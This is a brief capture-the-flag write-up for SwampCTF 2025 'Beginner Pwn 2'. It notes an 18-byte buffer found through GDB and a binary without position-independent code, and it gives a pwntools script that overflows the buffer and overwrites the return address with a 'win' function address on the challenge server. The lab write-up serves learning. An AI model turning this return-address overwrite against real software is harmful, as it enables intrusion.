---
tags:
  - pwn
  - binary_exploitation
  - ctf
---
![[SwampCTF2025 Beginner Pwn 2-20250331035915757.webp]]https://ctf.swampctf.com/files/ba73e4e10e45fd89e46dfc3842c14cbd/binary?token=eyJ1c2VyX2lkIjoxOTEsInRlYW1faWQiOjEwOCwiZmlsZV9pZCI6MjZ9.Z-oS_g.KjaTKth3XM4R_StKJgNkf2RbHQ8
1. ![[SwampCTF2025 Beginner Pwn 2-20250329004846811.webp]]
- I ran GDB a lot of times, and gave it different inputs, checking the return
  ![[SwampCTF2025 Beginner Pwn 2-20250329004459690.webp]]
- ![[SwampCTF2025 Beginner Pwn 2-20250329004752880.webp]]
- It turns out the buffer-size is 18, so anything afterwards is now the return statement
Since the checksec said that this did not have position independent code
The correct script is:
```python
import pwn

#r = pwn.process("./binary")

r = pwn.remote("chals.swampctf.com", 40001)
win_addr = 0x401186

payload = b"A" * 18
payload += pwn.p64(win_addr)
r.sendline(payload)
print(r.recvall().decode('latin-1'))  # Print flag
r.close()

```
